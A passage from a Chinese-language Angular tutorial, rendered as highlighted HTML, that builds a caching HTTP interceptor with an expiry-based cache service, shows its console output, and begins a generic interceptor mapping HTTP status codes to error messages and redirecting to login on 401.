    <span class="token comment">// 若缓存命中，则判断缓存是否过期，若已过期则返回null。否则返回请求对应的响应对象  </span>
    <span class="token keyword">const</span> isExpired <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> entry<span class="token punctuation">.</span>entryTime <span class="token operator">&gt;</span> <span class="token constant">MAX_CACHE_AGE</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>logger<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">req.urlWithParams is Expired: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>isExpired<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> isExpired <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> entry<span class="token punctuation">.</span>response<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">put</span><span class="token punctuation">(</span>req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">,</span> res<span class="token operator">:</span> HttpResponse<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token comment">// 创建CacheEntry对象  </span>
    <span class="token keyword">const</span> entry<span class="token operator">:</span> CacheEntry <span class="token operator">=</span> <span class="token punctuation">{</span>
      url<span class="token operator">:</span> req<span class="token punctuation">.</span>urlWithParams<span class="token punctuation">,</span>
      response<span class="token operator">:</span> res<span class="token punctuation">,</span>
      entryTime<span class="token operator">:</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>logger<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Save entry.url response into cache</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 以请求url作为键，CacheEntry对象为值，保存到cacheMap中。并执行</span>
    <span class="token comment">// 清理操作，即清理已过期的缓存。</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>cacheMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>urlWithParams<span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">deleteExpiredCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token function">deleteExpiredCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>cacheMap<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">entry</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> entry<span class="token punctuation">.</span>entryTime <span class="token operator">&gt;</span> <span class="token constant">MAX_CACHE_AGE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>cacheMap<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br></div></div><p>现在万事俱备只欠 “东风导弹” —— CachingInterceptor：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HttpInterceptor<span class="token punctuation">,</span> HttpRequest<span class="token punctuation">,</span> HttpResponse<span class="token punctuation">,</span> HttpHandler <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token keyword">of</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> tap <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs/operators'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> CacheService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../cache.service'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token constant">CACHABLE_URL</span> <span class="token operator">=</span> <span class="token string">&quot;http://jsonplaceholder.typicode.com&quot;</span><span class="token punctuation">;</span>

@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CachingInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HttpInterceptor</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> cache<span class="token operator">:</span> CacheService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token function">intercept</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">,</span> next<span class="token operator">:</span> HttpHandler</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 判断当前请求是否可缓存</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isRequestCachable</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
           <span class="token keyword">return</span> next<span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span>
        <span class="token comment">// 获取请求对应的缓存对象，若存在则直接返回该请求对象对应的缓存对象</span>
        <span class="token keyword">const</span> cachedResponse <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>cachedResponse <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
           <span class="token keyword">return</span> <span class="token keyword">of</span><span class="token punctuation">(</span>cachedResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 发送请求至API站点，请求成功后保存至缓存中</span>
        <span class="token keyword">return</span> next<span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>
           <span class="token function">tap</span><span class="token punctuation">(</span><span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>event <span class="token keyword">instanceof</span> <span class="token class-name">HttpResponse</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">;</span> 
              <span class="token punctuation">}</span>
           <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token comment">// 判断当前请求是否可缓存</span>
    <span class="token keyword">private</span> <span class="token function">isRequestCachable</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">===</span> <span class="token string">'GET'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token constant">CACHABLE_URL</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><p>与 LoggingInterceptor 拦截器一样，在使用它之前还需对 CachingInterceptor 进行配置：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>BrowserModule<span class="token punctuation">,</span> HttpClientModule<span class="token punctuation">]</span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> AuthInterceptor<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> LoggingInterceptor<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> CachingInterceptor<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>当应用启动后，我们点击页面上的 Get Users 按钮，此时控制台会输出以下内容：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>logger<span class="token punctuation">.</span>service<span class="token punctuation">.</span>ts<span class="token operator">:</span><span class="token number">8</span> Save entry<span class="token punctuation">.</span>url response into cache
logger<span class="token punctuation">.</span>service<span class="token punctuation">.</span>ts<span class="token operator">:</span><span class="token number">8</span> <span class="token constant">GET</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>jsonplaceholder<span class="token punctuation">.</span>typicode<span class="token punctuation">.</span>com<span class="token operator">/</span>users succeeded <span class="token keyword">in</span> <span class="token number">1296</span>ms
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>然后在过期前，我们再次点击 Get Users 按钮，这时控制台会输出以下内容：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>logger<span class="token punctuation">.</span>service<span class="token punctuation">.</span>ts<span class="token operator">:</span><span class="token number">8</span> req<span class="token punctuation">.</span>urlWithParams is Expired<span class="token operator">:</span> <span class="token boolean">false</span> 
logger<span class="token punctuation">.</span>service<span class="token punctuation">.</span>ts<span class="token operator">:</span><span class="token number">8</span> <span class="token constant">GET</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>jsonplaceholder<span class="token punctuation">.</span>typicode<span class="token punctuation">.</span>com<span class="token operator">/</span>users succeeded <span class="token keyword">in</span> <span class="token number">2</span>ms
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>而等缓存过期后（30 s），我们接着点击 Get Users 按钮，这时控制台会输出以下内容：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>req<span class="token punctuation">.</span>urlWithParams is Expired<span class="token operator">:</span> <span class="token boolean">true</span> 
logger<span class="token punctuation">.</span>service<span class="token punctuation">.</span>ts<span class="token operator">:</span><span class="token number">8</span> Save entry<span class="token punctuation">.</span>url response into cache
logger<span class="token punctuation">.</span>service<span class="token punctuation">.</span>ts<span class="token operator">:</span><span class="token number">8</span> <span class="token constant">GET</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>jsonplaceholder<span class="token punctuation">.</span>typicode<span class="token punctuation">.</span>com<span class="token operator">/</span>users succeeded <span class="token keyword">in</span> <span class="token number">1255</span>ms
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>通过观察以上的输出内容，我们发现 CachingInterceptor 已经能按照我们的预期正常工作了。</p> <h3 id="定制通用拦截器"><a href="#定制通用拦截器" class="header-anchor">#</a> 定制通用拦截器</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>Injectable<span class="token punctuation">,</span> Injector<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>
  HttpInterceptor<span class="token punctuation">,</span>
  HttpRequest<span class="token punctuation">,</span>
  HttpHandler<span class="token punctuation">,</span>
  HttpEvent<span class="token punctuation">,</span>
  HttpErrorResponse<span class="token punctuation">,</span>
  HttpResponseBase<span class="token punctuation">,</span>
  HttpResponse
<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Observable<span class="token punctuation">,</span> <span class="token keyword">of</span><span class="token punctuation">,</span> throwError<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>mergeMap<span class="token punctuation">,</span> catchError<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs/operators'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span>environment<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'src/environments/environment'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span>NzNotificationService<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'ng-zorro-antd'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NzMessageService<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'ng-zorro-antd/message'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Router<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/router'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>LocalStorageUtil<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../utils/localstorage.util'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>MenuService<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'core/services/menu.service'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>AtrReuseStrategy<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../routereuse/atr-reuse-strategy'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token constant">CODEMESSAGE</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token number">200</span><span class="token operator">:</span> <span class="token string">'服务器成功返回请求的数据。'</span><span class="token punctuation">,</span>
  <span class="token number">201</span><span class="token operator">:</span> <span class="token string">'新建或修改数据成功。'</span><span class="token punctuation">,</span>
  <span class="token number">202</span><span class="token operator">:</span> <span class="token string">'一个请求已经进入后台排队（异步任务）。'</span><span class="token punctuation">,</span>
  <span class="token number">204</span><span class="token operator">:</span> <span class="token string">'删除数据成功。'</span><span class="token punctuation">,</span>
  <span class="token number">400</span><span class="token operator">:</span> <span class="token string">'发出的请求有错误，服务器没有进行新建或修改数据的操作。'</span><span class="token punctuation">,</span>
  <span class="token number">401</span><span class="token operator">:</span> <span class="token string">'用户没有权限（令牌、用户名、密码错误）。'</span><span class="token punctuation">,</span>
  <span class="token number">403</span><span class="token operator">:</span> <span class="token string">'用户得到授权，但是访问是被禁止的。'</span><span class="token punctuation">,</span>
  <span class="token number">404</span><span class="token operator">:</span> <span class="token string">'发出的请求针对的是不存在的记录，服务器没有进行操作。'</span><span class="token punctuation">,</span>
  <span class="token number">406</span><span class="token operator">:</span> <span class="token string">'请求的格式不可得。'</span><span class="token punctuation">,</span>
  <span class="token number">410</span><span class="token operator">:</span> <span class="token string">'请求的资源被永久删除，且不会再得到的。'</span><span class="token punctuation">,</span>
  <span class="token number">422</span><span class="token operator">:</span> <span class="token string">'当创建一个对象时，发生一个验证错误。'</span><span class="token punctuation">,</span>
  <span class="token number">500</span><span class="token operator">:</span> <span class="token string">'服务器发生错误，请检查服务器。'</span><span class="token punctuation">,</span>
  <span class="token number">502</span><span class="token operator">:</span> <span class="token string">'网关错误。'</span><span class="token punctuation">,</span>
  <span class="token number">503</span><span class="token operator">:</span> <span class="token string">'服务不可用，服务器暂时过载或维护。'</span><span class="token punctuation">,</span>
  <span class="token number">504</span><span class="token operator">:</span> <span class="token string">'网关超时。'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">BaseInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HttpInterceptor</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> injector<span class="token operator">:</span> Injector</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token keyword">get</span> <span class="token function">msg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> NzMessageService <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>NzMessageService<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token keyword">get</span> <span class="token function">notification</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> NzNotificationService <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>NzNotificationService<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token keyword">get</span> <span class="token function">menuService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> MenuService <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>MenuService<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token function">goTo</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token operator">:</span> string<span class="token punctuation">,</span> isClearCache<span class="token operator">:</span> boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'需要跳转到页面：'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>injector<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>Router<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">navigateByUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>isClearCache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> AtrReuseStrategy<span class="token punctuation">.</span><span class="token function">deleteAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token function">checkStatus</span><span class="token punctuation">(</span><span class="token parameter">ev<span class="token operator">:</span> HttpResponseBase</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ev<span class="token punctuation">.</span>status <span class="token operator">&gt;=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> ev<span class="token punctuation">.</span>status <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">)</span> <span class="token operator">||</span> ev<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">401</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ev<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> errortext <span class="token operator">=</span> <span class="token constant">CODEMESSAGE</span><span class="token punctuation">[</span>ev<span class="token punctuation">.</span>status<span class="token punctuation">]</span> <span class="token operator">||</span> ev<span class="token punctuation">.</span>statusText<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>notification<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">请求错误 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ev<span class="token punctuation">.</span>status<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">:</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> errortext<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token function">handleData</span><span class="token punctuation">(</span>ev<span class="token operator">:</span> HttpResponseBase<span class="token punctuation">,</span> req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkStatus</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 业务处理：一些通用操作</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>ev<span class="token punctuation">.</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token number">200</span><span class="token operator">:</span>
        <span class="token comment">// TODO status</span>
        <span class="token comment">// 业务层级错误处理，以下是假定restful有一套统一输出格式（指不管成功与否都有相应的数据格式）情况下进行处理</span>
        <span class="token comment">// 例如响应内容：</span>
        <span class="token comment">//  错误内容：{ status: 1, msg: '非法参数' }</span>
        <span class="token comment">//  正确内容：{ status: 0, response: {  } }</span>
        <span class="token comment">// 则以下代码片断可直接适用</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ev <span class="token keyword">instanceof</span> <span class="token class-name">HttpResponse</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">const</span> body<span class="token operator">:</span> any <span class="token operator">=</span> ev<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>body <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">401</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>notification<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">未登录或登录已过期，请重新登录。</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
              nzKey<span class="token operator">:</span> <span class="token string">'outTime'</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// TODO 清空 token 信息</span>
            LocalStorageUtil<span class="token punctuation">.</span><span class="token function">removeUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>menuService<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">goTo</span><span class="token punctuation">(</span><span class="token string">'/p/login'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>body <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 或者依然保持完整的格式</span>
